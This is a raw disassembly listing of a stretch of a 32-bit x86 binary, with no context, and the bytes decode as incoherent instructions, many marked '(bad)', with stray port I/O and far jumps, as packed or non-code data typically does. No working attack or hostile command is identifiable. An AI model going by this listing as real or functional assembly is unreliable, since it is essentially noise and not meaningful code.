  41bea6:	xchg   edi,eax
  41bea7:	and    al,0x97
  41bea9:	jmp    0x41be32
  41beab:	fs push ds
  41bead:	fld    QWORD PTR [eax]
  41beaf:	cmp    BYTE PTR [edx-0x26],ch
  41beb2:	xor    dh,0xd4
  41beb5:	loope  0x41be51
  41beb7:	jns    0x41bf0b
  41beb9:	imul   BYTE PTR cs:[edi]
  41bebc:	add    al,0x3f
  41bebe:	aas    
  41bebf:	mov    ebp,0x7bd0a5f1
  41bec4:	fldpi  
  41bec6:	fild   WORD PTR [esi]
  41bec8:	les    ecx,FWORD PTR [esi]
  41beca:	mov    dh,0x1e
  41becc:	pop    esi
  41becd:	mov    eax,ds:0x16ec2c36
  41bed2:	das    
  41bed3:	or     al,dl
  41bed5:	push   es
  41bed6:	push   es
  41bed7:	add    BYTE PTR [esi+0x30],dl
  41beda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bedb:	inc    edx
  41bedc:	mov    ds:0xbb993682,al
  41bee1:	push   ss
  41bee2:	nop
  41bee3:	in     eax,0xa8
  41bee5:	in     al,dx
  41bee6:	xor    eax,0xcd7dd918
  41beeb:	fadd   DWORD PTR [ebp-0x59f86497]
  41bef1:	jg     0x41beb4
  41bef3:	ret    
  41bef4:	mov    ecx,0xe1c0d8a7
  41bef9:	and    dl,dh
  41befb:	mov    ebp,DWORD PTR [esp+esi*1-0x54]
  41beff:	pop    edi
  41bf00:	lods   al,BYTE PTR ds:[esi]
  41bf01:	std    
  41bf02:	(bad)  
  41bf03:	sti    
  41bf04:	add    al,BYTE PTR gs:[edi-0x67218f40]
  41bf0b:	cmc    
  41bf0c:	adc    esp,DWORD PTR [ecx]
  41bf0e:	inc    eax
  41bf0f:	cld    
  41bf10:	cs sub bh,cl
  41bf13:	test   al,0xd9
  41bf15:	mov    ds:0xc131ec84,eax
  41bf1a:	add    al,0xfd
  41bf1c:	xchg   edx,eax
  41bf1d:	add    bh,ch
  41bf1f:	retf   
  41bf20:	mov    ds:0xc6ab0b1d,eax
  41bf25:	lods   eax,DWORD PTR ds:[esi]
  41bf26:	dec    ecx
  41bf27:	add    eax,0x38a18fcd
  41bf2c:	jmp    0xcac99631
  41bf31:	repz cmc 
  41bf33:	pop    eax
  41bf34:	jg     0x41bf29
  41bf36:	push   es
  41bf37:	and    al,0xaa
  41bf39:	xchg   ebp,eax
  41bf3a:	mov    al,0x71
  41bf3c:	jo     0x41bece
  41bf3e:	pop    ss
  41bf3f:	or     eax,0x66382de9
  41bf44:	push   0x8cab09ea
  41bf49:	pop    ecx
  41bf4a:	aam    0xeb
  41bf4c:	push   edi
  41bf4d:	mov    ch,0x9a
  41bf4f:	push   0x77b26671
  41bf54:	mov    al,ds:0x92811e7f
  41bf59:	test   DWORD PTR [edx-0x27083c08],edx
  41bf5f:	(bad)  
  41bf60:	imul   DWORD PTR [ecx+0x2439682]
  41bf66:	call   0x84362227
  41bf6b:	xchg   edi,eax
  41bf6c:	add    DWORD PTR [ebp-0x179a06d9],esi
  41bf72:	out    dx,al
  41bf73:	mov    eax,0x1454f12e
  41bf78:	cmp    eax,0xeb652ee3
  41bf7d:	je     0x41bf6a
  41bf7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf80:	push   0xffffff98
  41bf82:	outs   dx,BYTE PTR ds:[esi]
  41bf83:	jecxz  0x41bfd1
  41bf85:	fs jecxz 0x41bf4a
  41bf88:	sbb    dl,BYTE PTR [ecx-0x7e]
  41bf8b:	jmp    0x41bf60
  41bf8d:	pop    ebp
  41bf8e:	jns    0x41bff9
  41bf90:	xchg   edi,eax
  41bf91:	pop    es
  41bf92:	inc    esp
  41bf93:	repz add eax,DWORD PTR [esi]
  41bf96:	pop    ebx
  41bf97:	xor    ah,0xa0
  41bf9a:	xor    esi,esp
  41bf9c:	das    
  41bf9d:	and    BYTE PTR [ecx],al
  41bf9f:	retf   
  41bfa0:	jns    0x41bfcf
  41bfa2:	push   esi
  41bfa3:	hlt    
  41bfa4:	test   al,0xa6
  41bfa6:	in     al,0x48
  41bfa8:	lock jge 0x41c000
  41bfab:	dec    ecx
  41bfad:	dec    al
  41bfaf:	add    ebx,DWORD PTR [edi]
  41bfb1:	lods   al,BYTE PTR ds:[esi]
  41bfb2:	lea    esp,fs:[edx+0x3b01d31b]
  41bfb9:	ins    BYTE PTR es:[edi],dx
  41bfba:	sahf   
  41bfbb:	mov    ecx,0xf3c9f3a0
  41bfc0:	mov    cl,0xde
  41bfc2:	sbb    al,0x68
  41bfc4:	pop    eax
  41bfc5:	std    
  41bfc6:	pop    ss
  41bfc7:	mov    bh,0x55
  41bfc9:	in     al,0x42
  41bfcb:	fidivr WORD PTR ds:0xae0f8675
  41bfd1:	je     0x41bfdb
  41bfd3:	sbb    esp,DWORD PTR [edi+eax*8]
  41bfd6:	pop    es
  41bfd7:	(bad)  
  41bfd8:	popa   
  41bfd9:	mov    al,ds:0x76c3084a
  41bfde:	add    edx,esp
  41bfe0:	jmp    FWORD PTR [ebp-0x2aa6b245]
  41bfe6:	push   ss
  41bfe7:	sbb    dl,BYTE PTR [edx+0x6d]
  41bfea:	aaa    
  41bfeb:	jno    0x41c054
  41bfed:	fs jge 0x41bfff
  41bff0:	mov    esi,0x51a97817
  41bff5:	xchg   ebx,eax
  41bff6:	lds    esp,FWORD PTR [ebx]
  41bff8:	sbb    edi,0xfffffffa
  41bffb:	inc    ebx
  41bffc:	fldenv [esi]
  41bffe:	or     eax,ebx
  41c000:	fidiv  DWORD PTR [edi]
  41c002:	cmp    bl,BYTE PTR [edx+0x26b6069a]
  41c008:	jl     0x41c023
  41c00a:	jbe    0x41c077
  41c00c:	cmp    al,0xc7
  41c00e:	jmp    0x41bfe3
  41c010:	xor    eax,0x3a4ffe7d
  41c015:	inc    ebx
  41c016:	scas   al,BYTE PTR es:[edi]
  41c017:	sub    DWORD PTR ds:0x681d495d,ebx
  41c01d:	jge    0x41c098
  41c01f:	push   ebp
  41c020:	jl     0x41c096
  41c022:	pop    ds
  41c023:	les    esp,FWORD PTR [ebp+0x24]
  41c026:	pop    edx
  41c027:	bound  esi,QWORD PTR [ecx]
  41c029:	retf   0x20f0
  41c02c:	inc    edi
  41c02d:	in     eax,0xbb
  41c02f:	fadd   st,st(0)
  41c031:	dec    esp
  41c032:	adc    BYTE PTR [esi-0x11],0xf6
  41c036:	sub    esi,DWORD PTR [edx+0x6375eb67]
  41c03c:	aas    
  41c03d:	push   ds
  41c03e:	push   es
  41c03f:	pop    esi
  41c040:	xchg   esp,eax
  41c041:	add    BYTE PTR [ecx],0xf5
  41c044:	push   eax
  41c045:	or     edx,esi
  41c047:	inc    ebx
  41c048:	xchg   ebp,eax
  41c049:	shr    ah,0x6
  41c04c:	out    dx,eax
  41c04d:	loopne 0x41c065
  41c04f:	ja     0x41c0a8
  41c051:	nop
  41c052:	retf   0x131c
  41c055:	jns    0x41c01d
  41c057:	ror    DWORD PTR [ecx-0x6d],cl
  41c05a:	add    edi,0xfdb97578
  41c060:	inc    esp
  41c061:	outs   dx,DWORD PTR ds:[esi]
  41c062:	mov    bh,0x57
  41c064:	ret    0x1bef
  41c067:	nop
  41c068:	add    al,0x1c
  41c06a:	push   edi
  41c06b:	xor    ebx,0xffffffef
  41c06e:	cmp    al,0x69
  41c070:	mov    ecx,0x7a1a2772
  41c075:	mov    eax,DWORD PTR [ebx-0x34af0752]
  41c07b:	add    al,0xf8
  41c07d:	mov    al,BYTE PTR [eax]
  41c07f:	add    BYTE PTR [eax],al
  41c081:	add    BYTE PTR [esi-0x10fe18c6],dh
  41c087:	(bad)  
  41c089:	mov    edi,0xdf2dff43
  41c08e:	sub    eax,0x7d11bc26
  41c093:	cmp    al,0x1
  41c095:	add    ah,dh
  41c097:	add    al,0x0
  41c099:	add    BYTE PTR [edx],dl
  41c09b:	(bad)  
  41c09c:	test   DWORD PTR [ebx-0x228d77b0],0xa235b5ce
  41c0a6:	xchg   BYTE PTR [ecx-0x3a],cl
  41c0a9:	dec    ax
  41c0ab:	sbb    DWORD PTR [edx],esp
  41c0ad:	sahf   
  41c0ae:	pop    edx
  41c0af:	out    dx,eax
  41c0b0:	xchg   ebx,eax
  41c0b1:	pop    ebp
  41c0b2:	or     BYTE PTR [ecx-0x13],ah
  41c0b5:	cmp    eax,0x1d42f86c
  41c0ba:	(bad)  
  41c0bb:	stc    
  41c0bc:	(bad)  
  41c0bd:	xchg   ecx,eax
  41c0be:	dec    eax
  41c0bf:	xchg   ebp,eax
  41c0c0:	outs   dx,BYTE PTR ds:[esi]
  41c0c1:	cmp    ebp,esi
  41c0c3:	mov    WORD PTR [ecx-0x4f],es
  41c0c6:	cld    
  41c0c7:	in     al,0x93
  41c0c9:	imul   ecx,DWORD PTR [edx-0x683c1c1e],0x2f12eb2c
  41c0d3:	jmp    0x41c073
  41c0d5:	xchg   esi,eax
  41c0d6:	retf   0x70d6
  41c0d9:	or     al,0x1b
  41c0db:	pop    es
  41c0dc:	cmp    al,0x6
  41c0de:	aaa    
  41c0df:	fsub   QWORD PTR [esi]
  41c0e1:	sub    DWORD PTR [ecx],eax
  41c0e3:	ret    
  41c0e4:	je     0x41c0e1
  41c0e6:	xchg   ebx,eax
  41c0e7:	mov    ds:0xaaf39d16,al
  41c0ec:	mul    DWORD PTR [edx-0x4d57090d]
  41c0f2:	or     BYTE PTR [eax],dl
  41c0f4:	scas   eax,DWORD PTR es:[edi]
  41c0f5:	mov    dl,0xc0
  41c0f7:	adc    BYTE PTR [ecx-0x5b477aad],ah
  41c0fd:	retf   
  41c0fe:	jnp    0x41c174
  41c100:	mov    bl,0xdb
  41c102:	xchg   BYTE PTR [ebx-0x67c26744],ch
  41c108:	mov    ebp,0x8f6a372f
  41c10d:	inc    edx
  41c10e:	cld    
  41c10f:	popa   
  41c110:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41c112:	jo     0x41c0f7
  41c114:	xor    esi,esi
  41c116:	pop    eax
  41c117:	add    edi,DWORD PTR ds:0x58dbb935
  41c11d:	sbb    esp,ebp
  41c11f:	jmp    0x8441:0x8a335643
  41c126:	addr16 push ss
  41c128:	and    BYTE PTR [edi-0x3f],al
  41c12b:	cmp    eax,0x8f952114
  41c130:	dec    ecx
  41c131:	adc    eax,0x2fab3d1e
  41c136:	sub    eax,0xcffd208c
  41c13b:	fisub  DWORD PTR [ecx+edx*2+0x2e]
  41c13f:	xchg   edi,eax
  41c140:	fxch   st(4)
  41c142:	sbb    esp,DWORD PTR [esi]
  41c144:	fist   WORD PTR [esi+0x74]
  41c147:	repnz mov ds:0xf537a415,eax
  41c14d:	xchg   BYTE PTR [ebp-0x46],dl
  41c150:	inc    esi
  41c151:	pop    ecx
  41c152:	mov    ebx,0x377fcb34
  41c157:	push   esp
  41c158:	aas    
  41c159:	jmp    0xa4d2:0xddf136a0
  41c160:	and    DWORD PTR [ecx-0x31],edi
  41c163:	or     edx,DWORD PTR [eax-0x1c]
  41c166:	jecxz  0x41c1d5
  41c168:	or     cl,0xff
  41c16b:	aaa    
  41c16c:	and    eax,0xaedc55f1
  41c171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c172:	out    0xf5,al
  41c174:	ins    BYTE PTR es:[edi],dx
  41c175:	and    ch,BYTE PTR [esi]
  41c177:	cmp    eax,0x28210145
  41c17c:	out    dx,eax
  41c17d:	or     al,0xa3
  41c17f:	popf   
  41c180:	adc    ch,bh
  41c182:	mov    ch,0xfb
  41c184:	pop    esp
  41c185:	loopne 0x41c149
  41c187:	addr16 push eax
  41c189:	out    0x7d,al
  41c18b:	int3   
  41c18c:	xor    eax,0xe058beff
  41c191:	test   al,0x46
  41c193:	jo     0x41c127
  41c195:	lahf   
  41c196:	jl     0x41c168
  41c198:	xor    al,BYTE PTR [ebx+0x29d4118d]
  41c19e:	sbb    DWORD PTR [eax+0x77],0xffffffc5
  41c1a2:	dec    edi
  41c1a3:	mov    ds:0x1512c9e4,al
  41c1a8:	jns    0x41c186
  41c1aa:	inc    ecx
  41c1ab:	cld    
  41c1ac:	shl    BYTE PTR [esi],cl
  41c1ae:	(bad)  
  41c1b0:	mov    edx,0x37055db1
  41c1b5:	aas    
  41c1b6:	xchg   edx,eax
  41c1b7:	pushf  
  41c1b8:	addr16 mov ebx,0x1d8d2459
  41c1be:	sbb    bh,ah
  41c1c0:	sbb    BYTE PTR [edx+0x735b030e],dh
  41c1c6:	jno    0x41c210
  41c1c8:	jne    0x41c1e5
  41c1ca:	mov    esi,DWORD PTR [eax+0x921b7ec]
  41c1d0:	inc    esi
  41c1d1:	or     ebx,eax
  41c1d3:	imul   edx,DWORD PTR [eax+edi*4],0x7e
  41c1d7:	jo     0x41c1fb
  41c1d9:	mov    dl,0xb5
  41c1db:	inc    ebx
  41c1dc:	xchg   ebp,eax
  41c1dd:	mov    ah,0x1
  41c1df:	sub    eax,0xb617221d
  41c1e4:	je     0x41c1d0
  41c1e6:	retf   0xf99f
  41c1e9:	sbb    al,0xac
  41c1eb:	mov    gs,WORD PTR [ecx+0x4de91a84]
  41c1f1:	mov    bh,0x3b
  41c1f3:	pop    esp
  41c1f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1f5:	jle    0x41c252
  41c1f7:	pop    eax
  41c1f8:	sub    BYTE PTR [edi-0x79f006b2],al
  41c1fe:	lods   eax,DWORD PTR ds:[esi]
  41c1ff:	mov    ds:0x12bb33cb,al
  41c204:	pop    edx
  41c205:	fbld   TBYTE PTR [ecx+0xd]
  41c208:	jl     0x41c20c
  41c20a:	fadd   QWORD PTR [eax+0x28ad63ef]
  41c210:	test   DWORD PTR [ebx],esi
  41c212:	stos   BYTE PTR es:[edi],al
  41c213:	rol    DWORD PTR [eax],0x58
  41c216:	stos   DWORD PTR es:[edi],eax
  41c217:	jb     0x41c220
  41c219:	ja     0x41c204
  41c21b:	inc    ebx
  41c21c:	push   ebx
  41c21d:	push   es
  41c21e:	cmp    al,ah
  41c220:	scas   al,BYTE PTR es:[edi]
  41c221:	int3   
  41c222:	pop    ebx
  41c223:	sti    
  41c224:	das    
  41c225:	aam    0x19
  41c227:	and    DWORD PTR [edx-0x4aa264aa],ebx
  41c22d:	rcr    bh,0x30
  41c230:	mov    eax,ds:0xd24daf34
  41c235:	push   eax
  41c236:	push   cs
  41c237:	adc    al,0xb8
  41c239:	mov    DWORD PTR [esi],ebx
  41c23b:	shl    BYTE PTR [ebx],cl
  41c23d:	lock sbb al,0xcb
  41c240:	add    al,0xfb
  41c242:	sub    al,0x7a
  41c244:	ret    0x6476
  41c247:	outs   dx,DWORD PTR ds:[esi]
  41c248:	call   0xff39:0x3ff2ed16
  41c24f:	retf   0x134c
  41c252:	xor    al,0xe
  41c254:	ins    DWORD PTR es:[edi],dx
  41c255:	inc    edi
  41c256:	je     0x41c263
  41c258:	cs xchg ebx,eax
  41c25a:	fwait
  41c25b:	rsm    
  41c25d:	mov    ds:0xfa84b28c,al
  41c262:	jl     0x41c2e1
  41c264:	leave  
  41c265:	nop
  41c266:	jl     0x41c201
  41c268:	xchg   BYTE PTR [edx],ah
  41c26a:	cs retf 
  41c26c:	je     0x41c2a4
  41c26e:	loope  0x41c2a7
  41c270:	sbb    DWORD PTR [edi+0x1],edx
  41c273:	test   DWORD PTR [eax-0x61],0x54eff88e
  41c27a:	xor    edi,edi
  41c27c:	dec    eax
  41c27d:	push   ecx
  41c27e:	cdq    
  41c27f:	inc    ecx
  41c280:	mov    ah,0x80
  41c282:	ror    BYTE PTR [ebx],0x99
  41c285:	out    dx,al
  41c286:	and    ch,dl
  41c288:	xchg   DWORD PTR [ebx-0x31],eax
  41c28b:	ins    DWORD PTR es:[edi],dx
  41c28c:	push   esi
  41c28d:	adc    DWORD PTR [ebx],0xe37e8b17
  41c293:	rcr    DWORD PTR [edx],1
  41c295:	dec    edx
  41c296:	pop    ecx
  41c297:	test   DWORD PTR [eax],esi
  41c299:	xchg   esi,eax
  41c29a:	jecxz  0x41c2be
  41c29c:	retf   0x2567
  41c29f:	dec    ecx
  41c2a0:	ja     0x41c261
  41c2a2:	outs   dx,BYTE PTR ds:[esi]
  41c2a3:	pusha  
  41c2a4:	and    BYTE PTR [edi],ah
  41c2a6:	jns    0x41c276
  41c2a8:	les    esp,FWORD PTR [ebp+0x73]
  41c2ab:	mov    ebp,esp
  41c2ad:	jl     0x41c2ce
  41c2af:	jne    0x41c24f
  41c2b1:	imul   DWORD PTR [edi+esi*4-0x42]
  41c2b5:	ja     0x41c2e6
  41c2b7:	jmp    0x6935:0x2330fd7f
  41c2be:	pop    esp
  41c2bf:	sahf   
  41c2c0:	mov    al,ds:0xb48f00d2
  41c2c5:	adc    BYTE PTR [edx+0x3b3d87e3],bh
  41c2cb:	ja     0x41c28a
  41c2cd:	aam    0xd8
  41c2cf:	jmp    0x51ee:0xa728a24f
  41c2d6:	xchg   esp,eax
  41c2d7:	push   ds
  41c2d8:	sar    BYTE PTR [edx-0x30],0x8b
  41c2dc:	dec    esi
  41c2dd:	mov    ah,0x14
  41c2df:	mov    dh,0x72
  41c2e1:	lds    ecx,FWORD PTR [ebx]
  41c2e3:	bound  ebp,QWORD PTR [ebp-0x1e]
  41c2e6:	xor    BYTE PTR [edx-0x2a],0x2
  41c2ea:	pop    esp
  41c2eb:	dec    edx
  41c2ec:	mov    ebp,0xf94875dc
  41c2f1:	cdq    
  41c2f2:	in     eax,0x27
  41c2f4:	mov    ecx,0x5d4a5e1d
  41c2f9:	sbb    DWORD PTR [edi+0x57],ebp
  41c2fc:	pop    esp
  41c2fd:	sti    
  41c2fe:	pop    ecx
  41c2ff:	or     dl,BYTE PTR ds:0x82dea265
  41c305:	test   al,0xde
  41c308:	aad    0x4e
  41c30a:	mov    gs,WORD PTR [edx+0x741b779e]
  41c310:	int3   
  41c311:	aaa    
  41c312:	clc    
  41c313:	aas    
  41c314:	push   0x76
  41c316:	push   esp
  41c317:	daa    
  41c318:	xchg   edx,eax
  41c319:	arpl   WORD PTR [edi],cx
  41c31b:	lods   eax,DWORD PTR ds:[esi]
  41c31c:	or     DWORD PTR [edx-0x80],edi
  41c31f:	lahf   
  41c320:	and    edi,ebx
  41c322:	mov    bh,dl
  41c324:	ins    DWORD PTR es:[edi],dx
  41c325:	adc    al,0x4b
  41c327:	cs pop ebp
  41c329:	stos   DWORD PTR es:[edi],eax
  41c32a:	pop    ss
  41c32b:	push   eax
  41c32c:	push   eax
  41c32d:	test   BYTE PTR [ebx-0x43aa22e2],ch
  41c333:	inc    ebp
  41c334:	dec    edi
  41c335:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c336:	mov    eax,ds:0xfce6d90a
  41c33b:	out    0x6e,al
  41c33d:	scas   eax,DWORD PTR es:[edi]
  41c33e:	adc    ebp,DWORD PTR [ebp-0x1b26601c]
  41c344:	adc    al,0xb2
  41c346:	push   esp
  41c347:	sbb    ebp,DWORD PTR [ebx-0x7c]
  41c34a:	sub    al,0xeb
  41c34c:	mov    ebp,0xdb4522e7
  41c351:	xor    dl,BYTE PTR [eax-0x4e]
  41c354:	cld    
  41c355:	adc    DWORD PTR [edi+edi*8],0x521e902c
  41c35c:	das    
  41c35d:	fs out dx,al
  41c35f:	daa    
  41c360:	scas   al,BYTE PTR es:[edi]
  41c361:	push   edx
  41c362:	cmp    DWORD PTR [esi+ebx*1],esp
  41c365:	enter  0x717c,0x76
  41c369:	adc    BYTE PTR [eax-0x225be76e],ah
  41c36f:	or     al,0xb6
  41c371:	idiv   ebx
  41c373:	pop    ecx
  41c374:	outs   dx,DWORD PTR ds:[esi]
  41c375:	xchg   BYTE PTR [ebx+0x699f4e4],dh
  41c37b:	or     ebp,DWORD PTR [eax-0x66]
  41c37e:	fs in  al,dx
  41c380:	outs   dx,DWORD PTR ds:[esi]
  41c381:	pop    edi
  41c382:	sbb    esp,DWORD PTR [edi]
  41c384:	mov    BYTE PTR [ebp-0x2e],bl
  41c387:	inc    ecx
  41c388:	dec    edi
  41c389:	push   0x19
  41c38b:	xchg   BYTE PTR [ecx+0x58],ch
  41c38e:	pop    ds
  41c38f:	ds aaa 
  41c391:	jg     0x41c3d0
  41c393:	or     al,0x1a
  41c395:	dec    ebx
  41c396:	xchg   ebp,eax
  41c397:	adc    BYTE PTR [eax-0x27],cl
  41c39a:	xchg   DWORD PTR [ebx-0x355bac23],esp
  41c3a0:	push   0xffffffbc
  41c3a2:	xor    eax,0xa9cf22
  41c3a7:	cmp    esi,ecx
  41c3a9:	mov    al,ds:0x8a1d5de8
  41c3ae:	pusha  
  41c3af:	adc    BYTE PTR [ecx-0x21],0xed
  41c3b3:	xchg   BYTE PTR [esp+edx*8-0x30c9126b],al
  41c3ba:	and    BYTE PTR [esi-0x7b],bh
  41c3bd:	and    al,0xe5
  41c3bf:	dec    ebp
  41c3c0:	test   al,0x6c
  41c3c2:	push   ss
  41c3c3:	addr16 leave 
  41c3c5:	dec    DWORD PTR es:[eax+0x513b3420]
  41c3cc:	ds sahf 
  41c3ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3cf:	push   esp
  41c3d0:	pop    ebx
  41c3d1:	div    DWORD PTR [edi]
  41c3d3:	pushf  
  41c3d4:	xchg   edx,eax
  41c3d5:	add    dh,0x5f
  41c3d8:	(bad)  
  41c3d9:	addr16 dec eax
  41c3db:	push   ebx
  41c3dc:	xor    al,0xf4
  41c3de:	xor    edx,edx
  41c3e0:	sub    DWORD PTR ds:0xe07b3be0,ebp
  41c3e6:	jge    0x41c36b
  41c3e8:	sti    
  41c3e9:	mov    ds:0xbe023636,eax
  41c3ee:	jp     0x41c3fd
  41c3f0:	dec    ebx
  41c3f1:	add    eax,0x77c03149
  41c3f6:	pop    esp
  41c3f7:	(bad)
  41c3fa:	xchg   esp,eax
  41c3fb:	or     eax,0xd507d7d3
  41c400:	fld    TBYTE PTR [edi-0x97a5e1f]
  41c406:	(bad)  [ecx]
  41c408:	mov    WORD PTR [edi+0x42],ss
  41c40b:	inc    eax
  41c40c:	stos   BYTE PTR es:[edi],al
  41c40d:	pop    ecx
  41c40e:	call   0x35689755
  41c413:	imul   edx
  41c415:	sbb    eax,0x563803fb
  41c41a:	add    edx,eax
  41c41c:	xchg   BYTE PTR [edi+0x79],ch
  41c41f:	fadd   st,st(1)
  41c421:	jecxz  0x41c3ce
  41c423:	inc    ebx
  41c424:	ins    DWORD PTR es:[edi],dx
  41c425:	dec    ebx
  41c426:	jge    0x41c3af
  41c428:	sar    ah,0x4f
  41c42b:	loop   0x41c471
  41c42d:	inc    esi
  41c42e:	sbb    BYTE PTR [edi+eiz*4+0x25f6437b],bl
  41c435:	mov    bh,BYTE PTR [ebx-0x6e6859d8]
  41c43b:	mov    edx,0x63b7c228
  41c440:	ss aad 0xb
  41c443:	xchg   ah,ch
  41c445:	add    al,0x56
  41c447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c448:	mov    ?,eax
  41c44a:	(bad)  
  41c44b:	inc    BYTE PTR [edx]
  41c44d:	leave  
  41c44e:	and    DWORD PTR [edi],ecx
  41c450:	ja     0x41c459
  41c452:	pop    esi
  41c453:	and    eax,0x96e7b79a
  41c458:	fist   WORD PTR [ecx-0x6]
  41c45b:	outs   dx,BYTE PTR ds:[esi]
  41c45c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c45d:	pusha  
  41c45e:	ins    BYTE PTR es:[edi],dx
  41c45f:	sbb    DWORD PTR [edi+0x1a],ebx
  41c462:	cmp    esi,DWORD PTR [ecx+0x42]
  41c465:	sahf   
  41c466:	add    al,0xd4
  41c468:	scas   al,BYTE PTR es:[edi]
  41c469:	or     BYTE PTR [edx+0x4ba15bab],al
  41c46f:	sbb    al,0x5e
  41c471:	ds inc esi
  41c473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c474:	sub    al,0xc0
  41c476:	mov    ch,BYTE PTR [esi]
  41c478:	mov    ecx,0x3e22518c
  41c47d:	test   BYTE PTR [esi],al
  41c47f:	pop    esi
  41c480:	shl    DWORD PTR [esi],1
  41c482:	inc    esp
  41c483:	mov    ebp,DWORD PTR [edx-0x55]
  41c486:	scas   eax,DWORD PTR es:[edi]
  41c487:	sbb    DWORD PTR [ecx+edi*2-0x7784c7cd],0xffffffa1
  41c48f:	mov    ah,BYTE PTR [eax+edi*8-0x1eada6e7]
  41c496:	inc    ebx
  41c497:	test   BYTE PTR [edi],0xd6
  41c49a:	popa   
  41c49b:	and    eax,0xca599ff
  41c4a0:	or     al,0xaa
  41c4a2:	xor    eax,0x3ed8618b
  41c4a7:	cdq    
  41c4a8:	fnstsw WORD PTR [ecx]
  41c4aa:	mov    esp,0x44caa6d5
  41c4af:	aad    0x4b
  41c4b1:	jne    0x41c4e0
  41c4b3:	jecxz  0x41c44f
  41c4b5:	pop    esp
  41c4b6:	retf   0x8649
  41c4b9:	int3   
  41c4ba:	sbb    BYTE PTR [eax],bl
  41c4bc:	nop
  41c4bd:	bound  esi,QWORD PTR [edx+0x2720eef0]
  41c4c3:	test   BYTE PTR [ebx],dl
  41c4c5:	(bad)  
  41c4c6:	div    cl
  41c4c8:	inc    ebp
  41c4c9:	popf   
  41c4ca:	rcl    BYTE PTR [eax-0x68f5e765],1
  41c4d0:	rol    BYTE PTR [edx-0x3b],0xa1
  41c4d4:	ja     0x41c501
  41c4d6:	enter  0x25a9,0x1c
  41c4da:	in     al,0xbb
  41c4dc:	xchg   ebx,eax
  41c4dd:	adc    BYTE PTR [eax-0x9],0xec
  41c4e1:	pop    esi
  41c4e2:	push   0xef874df9
  41c4e7:	lock outs dx,BYTE PTR ds:[esi]
  41c4e9:	sbb    esp,DWORD PTR [edi+0x68923305]
  41c4ef:	test   eax,0xb86b529e
  41c4f4:	mov    ch,0x5b
  41c4f6:	enter  0xc452,0x32
  41c4fa:	xor    eax,0xfa205411
  41c4ff:	(bad)  
  41c500:	int    0x8a
  41c502:	mov    eax,0x2ac94dcd
  41c507:	mov    dl,0x8f
  41c509:	mov    ds:0xfb147769,al
  41c50e:	mov    edx,0xadf0302c
  41c513:	(bad)  
  41c514:	in     al,dx
  41c515:	clc    
  41c516:	ret    
  41c517:	jge    0x41c4fe
  41c519:	popa   
  41c51a:	lods   al,BYTE PTR ds:[esi]
  41c51b:	pop    esp
  41c51c:	and    eax,0xc16522df
  41c521:	int    0xdb
  41c523:	popf   
  41c524:	inc    esp
  41c525:	loope  0x41c4d7
  41c527:	push   DWORD PTR [eax]
  41c529:	scas   al,BYTE PTR es:[edi]
  41c52a:	bswap  ecx
  41c52c:	(bad)  
  41c52e:	jge    0x41c52f
  41c530:	jmp    0x41c524
  41c532:	push   es
  41c533:	cdq    
  41c534:	fsub   DWORD PTR [ebp-0x1d]
  41c537:	mov    edi,0x53921499
  41c53c:	pop    ebp
  41c53d:	lahf   
  41c53e:	mov    al,0x31
  41c540:	sbb    BYTE PTR [ecx+0xff7fc4d],dh
  41c546:	or     BYTE PTR ds:0x40b4be6b,bl
  41c54c:	loop   0x41c4db
  41c54e:	jp     0x41c568
  41c550:	and    eax,0xbeffc7d4
  41c555:	scas   eax,DWORD PTR es:[edi]
  41c556:	mov    ch,0x15
  41c558:	popa   
  41c559:	mov    esi,ds
  41c55b:	xchg   edx,eax
  41c55c:	loop   0x41c51c
  41c55e:	cmp    BYTE PTR [edx-0x295603f9],ch
  41c564:	xchg   edi,eax
  41c565:	aaa    
  41c566:	push   0x3d
  41c568:	push   edi
  41c569:	clc    
  41c56a:	fadd   DWORD PTR [edx]
  41c56c:	arpl   WORD PTR [eax+0x639e7eb7],si
  41c572:	(bad)  
  41c573:	jmp    0x1c1d:0x5bfefc40
  41c57a:	(bad)  
  41c57c:	push   esp
  41c57d:	or     DWORD PTR [eax+ebp*4+0x2b],0xa927c80a
  41c585:	mov    ebx,DWORD PTR [ecx-0x7a4a3cce]
  41c58b:	adc    dh,ah
  41c58d:	add    DWORD PTR [eax],0xe5000000
  41c593:	adc    al,BYTE PTR [edi]
  41c595:	dec    ebx
  41c596:	neg    DWORD PTR [edi-0x13]
  41c599:	mov    esi,0xd2d3b943
  41c59e:	sub    al,0xdb
  41c5a0:	cwde   
  41c5a1:	int    0x71
  41c5a3:	inc    ecx
  41c5a4:	add    DWORD PTR [eax],eax
  41c5a6:	hlt    
  41c5a7:	add    al,0x0
  41c5a9:	add    bl,bl
  41c5ab:	ss dec edi
  41c5ad:	pop    eax
  41c5ae:	mov    edi,0xbe958ea9
  41c5b3:	nop
  41c5b4:	or     ch,BYTE PTR [ecx+0x3d]
  41c5b7:	adc    esi,esi
  41c5b9:	mov    ds:0xb6b82877,al
  41c5be:	dec    edi
  41c5bf:	push   ss
  41c5c0:	jmp    0x8ec6:0x26644c50
  41c5c7:	ret    
  41c5c8:	imul   ebp,DWORD PTR [ecx+ebx*2+0x58],0xcc356f4c
  41c5d0:	dec    ecx
  41c5d1:	sbb    BYTE PTR [eax-0x610fea82],dh
  41c5d7:	retf   0x9579
  41c5da:	mov    ebp,DWORD PTR [edx-0x668a1df8]
  41c5e0:	bound  edx,QWORD PTR [esi-0x7d]
  41c5e3:	xor    eax,0xf40f066c
  41c5e8:	inc    edx
  41c5e9:	js     0x41c5c5
  41c5eb:	mov    bh,0x23
  41c5ed:	add    eax,0xaa24a3b3
  41c5f2:	pop    ebx
  41c5f3:	xor    al,BYTE PTR [esi+ecx*4-0x58]
  41c5f7:	push   ebx
  41c5f8:	push   cs
  41c5f9:	idiv   BYTE PTR [eax]
  41c5fb:	lock fisubr DWORD PTR [eax+0x1bb5512c]
  41c602:	mov    BYTE PTR [ebx-0x289abca3],al
